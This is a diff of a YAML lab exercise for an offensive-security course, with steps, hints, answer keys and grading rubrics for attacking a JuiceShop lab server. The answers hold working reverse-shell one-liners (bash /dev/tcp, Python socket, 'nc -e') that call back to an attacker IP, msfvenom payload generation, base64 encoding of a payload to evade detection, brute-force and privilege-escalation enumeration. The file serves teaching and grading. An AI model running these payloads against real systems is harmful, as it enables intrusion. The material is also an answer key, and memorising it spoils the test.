@@ -3,8 +3,8 @@ title: 시스템 익스플로잇 (System Exploits)
 version: non-ai
 course: attack-nonai
 week: 7
-description: 버퍼 오버플로, 서비스 취약점 공격, Metasploit 활용 등 시스템 레벨의 익스플로잇 기법을 실습한다. 취약한 서비스를
-  식별하고 공격 코드를 실행하여 초기 접근을 확보한다.
+description: 버퍼 오버플로, 서비스 취약점 공격, Metasploit 활용 등 시스템 레벨의 익스플로잇 기법을 실습한다. 취약한 서비스를 식별하고 공격 코드를 실행하여 초기
+  접근을 확보한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -14,32 +14,58 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을
-    검색하라.
+  instruction: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을 검색하라.
   hint: searchsploit 서비스명 버전 형태로 검색한다
   category: recon
   points: 10
   answer: searchsploit apache 2.4 && echo '---' && searchsploit openssh
-  answer_detail: searchsploit은 Exploit-DB의 로컬 검색 도구로, 서비스명과 버전으로 공개된 익스플로잇을 검색한다.
-    -m 옵션으로 익스플로잇 코드를 현재 디렉토리에 복사할 수 있다.
+  answer_detail: searchsploit은 Exploit-DB의 로컬 검색 도구로, 서비스명과 버전으로 공개된 익스플로잇을 검색한다. -m 옵션으로 익스플로잇 코드를 현재
+    디렉토리에 복사할 수 있다.
   verify:
     type: output_contains
     expect: Exploit
     field: stdout
+    semantic:
+      intent: searchsploit 서비스별 검색 — searchsploit apache 2.4 && searchsploit openssh. Exploit-DB 로컬 검색.
+        -m 옵션으로 PoC 복사. 서비스 버전별 익스플로잇 매칭.
+      success_criteria:
+      - Exploit 키워드
+      - searchsploit apache 2.4 + openssh
+      - 서비스명+버전 검색
+      acceptable_methods:
+      - searchsploit
+      - Exploit-DB 웹
+      - Metasploit search type:exploit
+      negative_signs:
+      - searchsploit 없음
+      - 버전 매칭 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색하라.
   hint: msfconsole -q -x 'search type:exploit http; exit' 형태로 실행한다
   category: recon
   points: 10
-  answer: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head
-    -30
-  answer_detail: Metasploit은 세계 최대의 침투 테스트 프레임워크로, 수천 개의 익스플로잇 모듈을 포함한다. search 명령으로
-    대상 서비스에 적합한 모듈을 찾고, 자동화된 공격을 수행할 수 있다.
+  answer: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head -30
+  answer_detail: Metasploit은 세계 최대의 침투 테스트 프레임워크로, 수천 개의 익스플로잇 모듈을 포함한다. search 명령으로 대상 서비스에 적합한 모듈을 찾고,
+    자동화된 공격을 수행할 수 있다.
   verify:
     type: output_contains
     expect: exploit
     field: stdout
+    semantic:
+      intent: msfconsole nodejs 모듈 검색 — msfconsole -q -x 'search type:exploit name:nodejs; exit'. Metasploit
+        7,500+ 모듈. 대상 서비스 자동 공격 모듈 탐색.
+      success_criteria:
+      - exploit 키워드
+      - msfconsole -q -x search
+      - type:exploit name:nodejs
+      acceptable_methods:
+      - msfconsole search
+      - msfdb search
+      - online Rapid7 DB
+      negative_signs:
+      - msfconsole 없음
+      - search 명령 없음
   target_vm: attacker
 - order: 3
   instruction: JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집하라.
@@ -48,122 +74,234 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): msfconsole -q -x ''use auxiliary/scanner/http/http_version; set RHOSTS
-    10.20.30.80; set RPORT 3000; run; exit'' 2>/dev/null'
-  answer_detail: Metasploit의 auxiliary 모듈은 정보 수집, 스캐닝, 서비스 열거에 사용된다. exploit과 달리 공격을
-    수행하지 않으며, 대상 시스템의 정보를 안전하게 수집한다.
+    📎 참고 (CLI): msfconsole -q -x ''use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80; set
+    RPORT 3000; run; exit'' 2>/dev/null'
+  answer_detail: Metasploit의 auxiliary 모듈은 정보 수집, 스캐닝, 서비스 열거에 사용된다. exploit과 달리 공격을 수행하지 않으며, 대상 시스템의
+    정보를 안전하게 수집한다.
   verify:
     type: output_contains
     expect: 10.20.30.80
     field: stdout
+    semantic:
+      intent: Metasploit auxiliary 스캐너 — msfconsole 'use auxiliary/scanner/http/http_version; set RHOSTS
+        10.20.30.80; set RPORT 3000; run'. 공격 없이 정보 수집. exploit과 구분.
+      success_criteria:
+      - 10.20.30.80 키워드
+      - auxiliary/scanner/http/http_version
+      - RHOSTS + RPORT + run
+      acceptable_methods:
+      - msfconsole auxiliary 모듈
+      - msfcli
+      - armitage GUI
+      negative_signs:
+      - auxiliary 모듈 없음
+      - scanner 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: netcat으로 간단한 리버스 셸 리스너를 설정하라. 포트 4444에서 연결을 대기하라(5초 후 자동 종료).
   hint: nc -lvnp 포트 형태로 리스너를 설정한다
   category: exploit
   points: 10
-  answer: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep
-    1 && echo 'test connection' | nc -w 1 localhost 4444 2>/dev/null; wait
-  answer_detail: 리버스 셸 리스너는 공격자 측에서 연결을 대기하는 서버이다. 대상 시스템에서 역방향으로 연결을 맺으면(reverse
-    shell), 방화벽의 outbound 규칙을 우회하여 셸 접근이 가능하다.
+  answer: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep 1 && echo 'test
+    connection' | nc -w 1 localhost 4444 2>/dev/null; wait
+  answer_detail: 리버스 셸 리스너는 공격자 측에서 연결을 대기하는 서버이다. 대상 시스템에서 역방향으로 연결을 맺으면(reverse shell), 방화벽의 outbound
+    규칙을 우회하여 셸 접근이 가능하다.
   verify:
     type: output_contains
     expect: Listener started
     field: stdout
+    semantic:
+      intent: netcat 리버스 셸 리스너 — timeout 5 nc -lvnp 4444 + 연결 테스트. -l listen + -v verbose + -n numeric
+        + -p port. 공격자 측 연결 대기. 방화벽 outbound 우회 기반.
+      success_criteria:
+      - Listener started 키워드
+      - nc -lvnp 4444
+      - 5초 타임아웃
+      acceptable_methods:
+      - nc -lvnp
+      - ncat --listen -p
+      - socat TCP-LISTEN
+      - pwncat-cs
+      negative_signs:
+      - nc -l 없음
+      - 포트 4444 없음
+      - 리버스 셸 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: bash 리버스 셸 페이로드를 생성하라. python3으로 {{ATTACKER_IP}}:4444로 연결하는 리버스 셸 명령을
-    출력하라(실행하지 않고 출력만).
+  instruction: bash 리버스 셸 페이로드를 생성하라. python3으로 {{ATTACKER_IP}}:4444로 연결하는 리버스 셸 명령을 출력하라(실행하지 않고 출력만).
   hint: bash -i >& /dev/tcp/IP/PORT 0>&1 형태이다
   category: exploit
   points: 10
   answer: 'echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >& /dev/tcp/10.20.30.201/4444
     0>&1'' && echo ''Python: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"''
     && echo ''Netcat: nc -e /bin/bash 10.20.30.201 4444'''
-  answer_detail: 리버스 셸 페이로드는 다양한 언어(Bash, Python, Perl, PHP, Netcat)로 생성할 수 있다. 대상
-    시스템에서 사용 가능한 도구에 따라 적절한 페이로드를 선택한다.
+  answer_detail: 리버스 셸 페이로드는 다양한 언어(Bash, Python, Perl, PHP, Netcat)로 생성할 수 있다. 대상 시스템에서 사용 가능한 도구에 따라
+    적절한 페이로드를 선택한다.
   verify:
     type: output_contains
     expect: Reverse Shell Payloads
     field: stdout
+    semantic:
+      intent: 리버스 셸 페이로드 — Bash 'bash -i >& /dev/tcp/IP/4444 0>&1' + Python 'socket+subprocess+os.dup2'
+        + Netcat 'nc -e /bin/bash IP 4444'. 3개 이상 언어 페이로드. MITRE ATT&CK T1059.
+      success_criteria:
+      - Reverse Shell Payloads 키워드
+      - Bash + Python + Netcat 3개 이상
+      - IP:PORT 명시
+      acceptable_methods:
+      - bash /dev/tcp 리버스
+      - python socket + subprocess
+      - nc -e /bin/bash
+      - msfvenom shell_reverse_tcp
+      negative_signs:
+      - 페이로드 2개 이하
+      - T1059 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST={{ATTACKER_IP}},
-    LPORT=4444로 설정하라.
+  instruction: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST={{ATTACKER_IP}}, LPORT=4444로 설정하라.
   hint: msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다
   category: exploit
   points: 10
-  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
-    elf -o /tmp/reverse_shell.elf 2>/dev/null && file /tmp/reverse_shell.elf && ls
-    -la /tmp/reverse_shell.elf
-  answer_detail: msfvenom은 Metasploit의 페이로드 생성 도구이다. 다양한 OS/아키텍처(Windows, Linux, macOS)와
-    출력 형식(ELF, EXE, Python, PHP 등)을 지원한다. 실전에서는 AV 회피를 위해 인코딩을 적용한다.
+  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/reverse_shell.elf
+    2>/dev/null && file /tmp/reverse_shell.elf && ls -la /tmp/reverse_shell.elf
+  answer_detail: msfvenom은 Metasploit의 페이로드 생성 도구이다. 다양한 OS/아키텍처(Windows, Linux, macOS)와 출력 형식(ELF, EXE,
+    Python, PHP 등)을 지원한다. 실전에서는 AV 회피를 위해 인코딩을 적용한다.
   verify:
     type: output_contains
     expect: ELF
     field: stdout
+    semantic:
+      intent: msfvenom Linux ELF — msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444
+        -f elf -o /tmp/reverse_shell.elf + file 검증. ELF64 리버스 셸 바이너리. AV 회피 인코딩 기반.
+      success_criteria:
+      - ELF 키워드
+      - msfvenom -p linux/x64/shell_reverse_tcp
+      - LHOST/LPORT + -f elf
+      acceptable_methods:
+      - msfvenom -p -f elf
+      - msfvenom + encoder
+      - Veil Framework
+      - Shellter
+      negative_signs:
+      - msfvenom 없음
+      - -f elf 없음
+      - LHOST/LPORT 없음
   target_vm: attacker
 - order: 7
-  instruction: web 서버({{WEB_IP}})에 SSH로 접속하여 커널 버전과 배포판 정보를 확인하라. 이는 커널 익스플로잇 선택에
-    필요한 정보이다.
+  instruction: web 서버({{WEB_IP}})에 SSH로 접속하여 커널 버전과 배포판 정보를 확인하라. 이는 커널 익스플로잇 선택에 필요한 정보이다.
   hint: uname -a와 cat /etc/os-release 명령을 실행한다
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'uname -a && echo --- && cat /etc/os-release' 2>/dev/null
-  answer_detail: 커널 버전과 배포판 정보는 로컬 권한 상승 익스플로잇(DirtyPipe, DirtyCow 등)의 적용 가능 여부를 판단하는
-    핵심 정보이다. 정확한 커널 버전이 익스플로잇 선택의 기준이 된다.
+  answer_detail: 커널 버전과 배포판 정보는 로컬 권한 상승 익스플로잇(DirtyPipe, DirtyCow 등)의 적용 가능 여부를 판단하는 핵심 정보이다. 정확한 커널
+    버전이 익스플로잇 선택의 기준이 된다.
   verify:
     type: output_contains
     expect: Linux
     field: stdout
+    semantic:
+      intent: 커널/배포판 정보 수집 — ssh ccc@10.20.30.80 'uname -a && cat /etc/os-release'. 커널 버전 → DirtyPipe/DirtyCow
+        등 로컬 권한 상승 익스플로잇 매칭. LPE 기반.
+      success_criteria:
+      - Linux 키워드
+      - ssh + uname -a + /etc/os-release
+      - 커널 버전 확인
+      acceptable_methods:
+      - ssh + uname
+      - ssh + hostnamectl
+      - LinPEAS 자동 수집
+      negative_signs:
+      - uname -a 없음
+      - 커널 버전 맥락 없음
+      - LPE 맥락 없음
   target_vm: attacker
 - order: 8
   instruction: web 서버에서 실행 중인 서비스 목록을 확인하라. 잠재적으로 취약한 서비스를 식별하라.
   hint: systemctl list-units --type=service로 서비스를 확인한다
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running'
-    2>/dev/null | head -30
-  answer_detail: 실행 중인 서비스 목록은 공격 표면을 파악하는 데 필수적이다. 불필요한 서비스가 실행 중이면 공격 벡터가 증가한다.
-    각 서비스의 버전을 확인하여 알려진 취약점을 검색한다.
+  answer: ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running' 2>/dev/null | head
+    -30
+  answer_detail: 실행 중인 서비스 목록은 공격 표면을 파악하는 데 필수적이다. 불필요한 서비스가 실행 중이면 공격 벡터가 증가한다. 각 서비스의 버전을 확인하여 알려진
+    취약점을 검색한다.
   verify:
     type: output_contains
     expect: service
     field: stdout
+    semantic:
+      intent: 실행 서비스 조회 — ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running' |
+        head -30. 공격 표면 파악. 불필요 서비스 식별 → 공격 벡터 축소 권장.
+      success_criteria:
+      - service 키워드
+      - systemctl list-units --state=running
+      - ssh 원격 실행
+      acceptable_methods:
+      - systemctl list-units
+      - ps aux
+      - ss -tlnp
+      negative_signs:
+      - systemctl 없음
+      - 실행 서비스 맥락 없음
   target_vm: attacker
 - order: 9
-  instruction: curl로 JuiceShop의 /api/Quantitys 엔드포인트에 접근하여 에러 메시지에서 스택 트레이스가 노출되는지
-    확인하라.
+  instruction: curl로 JuiceShop의 /api/Quantitys 엔드포인트에 접근하여 에러 메시지에서 스택 트레이스가 노출되는지 확인하라.
   hint: 존재하지 않는 API에 접근하면 프레임워크 에러가 노출될 수 있다
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Quantitys 2>/dev/null | python3
-    -m json.tool 2>/dev/null || curl -s http://10.20.30.80:3000/api/Quantitys'
-  answer_detail: 에러 메시지에 스택 트레이스, 파일 경로, 데이터베이스 정보 등이 포함되면 Information Disclosure
-    취약점이다. 공격자는 이 정보로 내부 구조를 파악하고 정밀한 공격을 계획할 수 있다.
+    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Quantitys 2>/dev/null | python3 -m json.tool 2>/dev/null
+    || curl -s http://10.20.30.80:3000/api/Quantitys'
+  answer_detail: 에러 메시지에 스택 트레이스, 파일 경로, 데이터베이스 정보 등이 포함되면 Information Disclosure 취약점이다. 공격자는 이 정보로 내부
+    구조를 파악하고 정밀한 공격을 계획할 수 있다.
   verify:
     type: output_contains
     expect:
     - error
     - stacktrace
     field: stdout
+    semantic:
+      intent: 스택 트레이스 노출 — curl /api/Quantitys | python3 json.tool (존재하지 않는 API). 프레임워크 에러 노출 시 파일 경로/DB
+        정보 유출. Information Disclosure (CWE-209).
+      success_criteria:
+      - error 또는 stacktrace 키워드
+      - curl /api/Quantitys (존재하지 않는 엔드포인트)
+      - 에러 응답 확인
+      acceptable_methods:
+      - curl 존재하지 않는 엔드포인트
+      - Burp Repeater 에러 유도
+      - fuzzing
+      negative_signs:
+      - 에러 유도 없음
+      - CWE-209 맥락 없음
   target_vm: attacker
 - order: 10
   instruction: python3으로 간단한 포트 스캐너를 작성하고 {{WEB_IP}}의 1-1024 포트를 스캔하라.
   hint: socket.connect_ex()를 사용하여 포트 상태를 확인한다
   category: exploit
   points: 10
-  answer: 'python3 -c "import socket; [print(f''Port {p}: OPEN'') for p in range(1,1025)
-    if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((''10.20.30.80'',
-    p)) == 0]" 2>/dev/null'
-  answer_detail: 커스텀 스캐너 작성은 도구에 의존하지 않고 원리를 이해하는 데 도움이 된다. connect_ex()는 연결 성공 시
-    0을 반환하며, 이를 이용하여 열린 포트를 식별한다.
+  answer: 'python3 -c "import socket; [print(f''Port {p}: OPEN'') for p in range(1,1025) if socket.socket(socket.AF_INET,
+    socket.SOCK_STREAM).connect_ex((''10.20.30.80'', p)) == 0]" 2>/dev/null'
+  answer_detail: 커스텀 스캐너 작성은 도구에 의존하지 않고 원리를 이해하는 데 도움이 된다. connect_ex()는 연결 성공 시 0을 반환하며, 이를 이용하여 열린
+    포트를 식별한다.
   verify:
     type: output_contains
     expect: OPEN
     field: stdout
+    semantic:
+      intent: Python 포트 스캐너 — python3 + socket.connect_ex((IP, p)) == 0 + range(1, 1025). 1-1024 포트 수동
+        스캔. nmap 없이 원리 이해. connect_ex = 성공 시 0 반환.
+      success_criteria:
+      - OPEN 키워드
+      - socket.connect_ex + range(1,1025)
+      - 포트 1-1024
+      acceptable_methods:
+      - python socket.connect_ex
+      - nmap -sT
+      - nc -zv
+      negative_signs:
+      - socket 없음
+      - 1-1024 범위 아님
   target_vm: attacker
 - order: 11
   instruction: Metasploit의 http_login auxiliary 모듈을 사용하여 JuiceShop의 기본 인증을 테스트하라.
@@ -172,30 +310,56 @@ steps:
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
 
-    📎 참고 (CLI): msfconsole -q -x ''use auxiliary/scanner/http/http_login; set RHOSTS
-    10.20.30.80; set RPORT 3000; set AUTH_URI /rest/user/login; info; exit'' 2>/dev/null
-    | head -30'
-  answer_detail: Metasploit의 http_login 모듈은 웹 인증에 대한 자동화된 브루트포스를 수행한다. 사전 파일과 사용자
-    목록을 지정하여 대량의 자격 증명을 테스트할 수 있다.
+    📎 참고 (CLI): msfconsole -q -x ''use auxiliary/scanner/http/http_login; set RHOSTS 10.20.30.80; set
+    RPORT 3000; set AUTH_URI /rest/user/login; info; exit'' 2>/dev/null | head -30'
+  answer_detail: Metasploit의 http_login 모듈은 웹 인증에 대한 자동화된 브루트포스를 수행한다. 사전 파일과 사용자 목록을 지정하여 대량의 자격 증명을
+    테스트할 수 있다.
   verify:
     type: output_contains
     expect: http
     field: stdout
+    semantic:
+      intent: msfconsole http_login — msfconsole 'use auxiliary/scanner/http/http_login; set RHOSTS; RPORT
+        3000; AUTH_URI /rest/user/login; info'. 자동 웹 브루트포스. 사용자+비밀번호 사전 지원.
+      success_criteria:
+      - http 키워드
+      - auxiliary/scanner/http/http_login
+      - AUTH_URI 설정
+      acceptable_methods:
+      - msfconsole http_login
+      - hydra http-post-form
+      - Burp Intruder
+      negative_signs:
+      - http_login 모듈 없음
+      - AUTH_URI 없음
   target_vm: attacker
 - order: 12
-  instruction: web 서버에서 crontab 설정을 확인하여 자동 실행되는 작업이 있는지 검사하라. 잘못 설정된 cronjob은 권한
-    상승에 활용될 수 있다.
+  instruction: web 서버에서 crontab 설정을 확인하여 자동 실행되는 작업이 있는지 검사하라. 잘못 설정된 cronjob은 권한 상승에 활용될 수 있다.
   hint: SSH로 접속하여 crontab -l과 /etc/crontab을 확인한다
   category: recon
   points: 10
-  answer: ssh ccc@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab
-    2>/dev/null; echo ---; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
-  answer_detail: cronjob이 world-writable 스크립트를 root 권한으로 실행하면 권한 상승에 악용할 수 있다. 공격자가
-    해당 스크립트에 악성 코드를 삽입하면 다음 실행 시 root로 실행된다.
+  answer: ssh ccc@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab 2>/dev/null; echo ---;
+    ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
+  answer_detail: cronjob이 world-writable 스크립트를 root 권한으로 실행하면 권한 상승에 악용할 수 있다. 공격자가 해당 스크립트에 악성 코드를 삽입하면
+    다음 실행 시 root로 실행된다.
   verify:
     type: output_contains
     expect: cron
     field: stdout
+    semantic:
+      intent: crontab 조사 — ssh + crontab -l + cat /etc/crontab + ls /etc/cron.d/. 자동 실행 작업 점검. world-writable
+        스크립트 + root cronjob → LPE.
+      success_criteria:
+      - cron 키워드
+      - crontab -l + /etc/crontab + /etc/cron.d
+      - ssh 원격
+      acceptable_methods:
+      - crontab -l
+      - systemctl list-timers
+      - pspy process monitor
+      negative_signs:
+      - crontab 조회 없음
+      - 권한 상승 맥락 없음
   target_vm: attacker
 - order: 13
   instruction: web 서버의 SUID 바이너리를 검색하라. 비정상적인 SUID 바이너리는 권한 상승에 활용할 수 있다.
@@ -203,46 +367,89 @@ steps:
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null
-  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 실행 시 소유자(보통 root)의 권한으로 실행된다. GTFOBins
-    사이트에서 각 바이너리의 권한 상승 방법을 확인할 수 있다.
+  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 실행 시 소유자(보통 root)의 권한으로 실행된다. GTFOBins 사이트에서 각 바이너리의
+    권한 상승 방법을 확인할 수 있다.
   verify:
     type: output_contains
     expect: /usr
     field: stdout
+    semantic:
+      intent: SUID 바이너리 검색 — ssh + find / -perm -4000 -type f. SUID 비트 (4000) → 소유자(root) 권한 실행. GTFOBins
+        사이트에서 각 바이너리 권한 상승 방법 조회.
+      success_criteria:
+      - /usr 키워드 (SUID 경로)
+      - find -perm -4000
+      - ssh 원격
+      acceptable_methods:
+      - find -perm -4000
+      - linpeas.sh
+      - GTFOBins
+      - LinEnum
+      negative_signs:
+      - -perm -4000 없음
+      - SUID 맥락 없음
+      - GTFOBins 맥락 없음
   target_vm: attacker
 - order: 14
   instruction: msfvenom으로 Python 리버스 셸 페이로드를 생성하라. base64로 인코딩하여 탐지를 회피하라.
   hint: msfvenom -f python 출력을 base64 인코딩한다
   category: exploit
   points: 15
-  answer: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw
-    2>/dev/null | base64 | head -5 && echo '...(truncated)'
-  answer_detail: 페이로드 인코딩은 시그니처 기반 탐지를 우회하는 기본 기법이다. Base64 인코딩된 페이로드는 exec(base64.b64decode(...))로
-    실행할 수 있다. 실전에서는 다중 인코딩과 커스텀 암호화를 사용한다.
+  answer: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw 2>/dev/null | base64
+    | head -5 && echo '...(truncated)'
+  answer_detail: 페이로드 인코딩은 시그니처 기반 탐지를 우회하는 기본 기법이다. Base64 인코딩된 페이로드는 exec(base64.b64decode(...))로 실행할
+    수 있다. 실전에서는 다중 인코딩과 커스텀 암호화를 사용한다.
   verify:
     type: output_contains
     expect: truncated
     field: stdout
+    semantic:
+      intent: msfvenom Python base64 인코딩 — msfvenom -p python/shell_reverse_tcp LHOST LPORT -f raw | base64
+        | head -5. 시그니처 기반 AV 탐지 회피. exec(base64.b64decode(...)) 패턴.
+      success_criteria:
+      - truncated 키워드 (출력 제한)
+      - msfvenom -f raw + base64
+      - python/shell_reverse_tcp
+      acceptable_methods:
+      - msfvenom + base64 파이프
+      - Veil Framework 인코딩
+      - Shellter 동적 인젝션
+      negative_signs:
+      - base64 인코딩 없음
+      - AV 회피 맥락 없음
   target_vm: attacker
 - order: 15
-  instruction: 시스템 익스플로잇 실습 결과를 /tmp/exploit_report.txt에 정리하라. 공격 경로, 획득한 정보, 보안 권고를
-    포함하라.
+  instruction: 시스템 익스플로잇 실습 결과를 /tmp/exploit_report.txt에 정리하라. 공격 경로, 획득한 정보, 보안 권고를 포함하라.
   hint: Kill chain 순서로 정리한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== System Exploit Report ===\n\n[Attack Surface]\n- Apache 2.4
-    (port 80)\n- Node.js/JuiceShop (port 3000)\n- SSH (port 22)\n\n[Findings]\n1.
-    Kernel version identified\n2. SUID binaries enumerated\n3. Cronjob configurations
-    reviewed\n4. Service list collected\n5. Reverse shell payloads prepared\n\n[Kill
-    Chain Progress]\n1. Reconnaissance: Complete\n2. Initial Access: JuiceShop SQLi/SSH
-    weak password\n3. Execution: Reverse shell ready\n\n[Recommendations]\n1. Patch
-    kernel to latest version\n2. Remove unnecessary SUID bits\n3. Audit cronjob permissions\n4.
-    Disable unused services\n5. Implement application sandboxing'' > /tmp/exploit_report.txt
-    && cat /tmp/exploit_report.txt'
-  answer_detail: 시스템 익스플로잇 보고서는 Cyber Kill Chain 단계별로 정리하면 체계적이다. 공격 표면, 발견된 취약점,
-    진행된 공격 단계, 방어 권고를 명확히 구분하여 작성한다.
+  answer: 'echo -e ''=== System Exploit Report ===\n\n[Attack Surface]\n- Apache 2.4 (port 80)\n- Node.js/JuiceShop
+    (port 3000)\n- SSH (port 22)\n\n[Findings]\n1. Kernel version identified\n2. SUID binaries enumerated\n3.
+    Cronjob configurations reviewed\n4. Service list collected\n5. Reverse shell payloads prepared\n\n[Kill
+    Chain Progress]\n1. Reconnaissance: Complete\n2. Initial Access: JuiceShop SQLi/SSH weak password\n3.
+    Execution: Reverse shell ready\n\n[Recommendations]\n1. Patch kernel to latest version\n2. Remove
+    unnecessary SUID bits\n3. Audit cronjob permissions\n4. Disable unused services\n5. Implement application
+    sandboxing'' > /tmp/exploit_report.txt && cat /tmp/exploit_report.txt'
+  answer_detail: 시스템 익스플로잇 보고서는 Cyber Kill Chain 단계별로 정리하면 체계적이다. 공격 표면, 발견된 취약점, 진행된 공격 단계, 방어 권고를 명확히
+    구분하여 작성한다.
   verify:
     type: output_contains
     expect: System Exploit Report
     field: stdout
+    semantic:
+      intent: '시스템 익스플로잇 보고서 — echo > /tmp/exploit_report.txt: [Attack Surface] Apache:80 + Node.js:3000
+        + SSH:22 + [Findings] 커널/SUID/cron/서비스/페이로드 + [Kill Chain] Recon→Initial Access→Execution + [Recommendations]
+        커널 패치/SUID 제거/cron 감사/서비스 비활성화/샌드박싱. Cyber Kill Chain 단계별.'
+      success_criteria:
+      - System Exploit Report 키워드
+      - Attack Surface + Findings + Kill Chain + Recommendations 4섹션
+      - Kill Chain 단계
+      acceptable_methods:
+      - echo > 보고서
+      - Lockheed Kill Chain template
+      - MITRE ATT&CK Navigator
+      negative_signs:
+      - 섹션 2개 이하
+      - Kill Chain 맥락 없음
+      - Recommendations 없음
   target_vm: attacker
